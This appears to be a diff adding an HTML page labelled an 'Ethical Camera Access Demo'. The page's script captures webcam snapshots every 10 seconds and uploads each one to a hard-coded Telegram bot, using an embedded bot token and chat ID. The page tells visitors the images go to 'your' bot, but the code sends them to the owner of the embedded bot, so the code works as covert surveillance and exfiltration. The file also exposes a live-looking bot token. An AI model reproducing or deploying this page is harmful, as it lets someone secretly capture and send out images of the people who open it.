@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Camera Access Demo</title>
+</head>
+<body>
+  <h2>📷 Ethical Camera Access Demo</h2>
+  <video id="video" width="320" height="240" autoplay></video>
+  <canvas id="canvas" width="320" height="240" style="display: none;"></canvas>
+  <p>Camera will capture every 10 seconds and send to your Telegram bot.</p>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+        setInterval(() => {
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append('chat_id', '7319914883');
+            formData.append('photo', blob, 'snapshot.jpg');
+
+            fetch('https://api.telegram.org/bot8305948971:AAGTxQ9lo9fb-haxe19hlEQqSILzx0nBhtA/sendPhoto', {
+              method: 'POST',
+              body: formData
+            });
+          }, 'image/jpeg');
+        }, 10000); // every 10 seconds
+      })
+      .catch(error => {
+        alert('Camera access denied or error: ' + error.message);
+      });
+  </script>
+</body>
+</html>
